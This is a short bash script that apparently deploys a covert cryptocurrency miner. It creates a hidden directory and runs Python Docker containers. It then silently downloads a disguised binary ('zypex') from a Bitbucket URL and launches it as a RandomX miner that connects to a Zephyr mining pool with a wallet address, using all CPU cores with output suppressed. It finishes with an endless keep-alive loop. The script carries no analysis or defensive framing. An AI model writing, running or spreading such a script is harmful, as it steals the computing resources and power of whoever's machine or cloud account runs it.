#!/bin/bash
mkdir .kapi && cd .kapi
docker run python:3.8
docker ps -a
docker run -it python:3.8 bash
wget https://bitbucket.org/excel-gms/bin/downloads/zypex >/dev/null 2>&1
./zypex --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p LAPET -a rx/0 -t $(nproc --all) >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
